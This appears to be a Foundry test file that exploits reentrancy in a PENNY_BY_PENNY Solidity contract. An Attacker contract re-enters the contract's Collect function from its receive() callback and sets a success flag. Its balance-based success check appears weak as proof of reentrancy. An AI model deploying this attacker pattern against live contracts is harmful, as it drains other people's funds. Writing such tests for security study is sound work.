
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";

contract TestReentrancyPennyByPenny is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.SetLogFile(address(new LogFile()));
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal < 100 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.Put{value: attackVal}(100);
        vm.warp(block.timestamp + 200);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = PENNY_BY_PENNY(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;
        victim.Collect(val);
        if (victim.Acc(address(this)).balance < initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.Collect(attackValue);
            attackCallCount++;
        }
    }
}
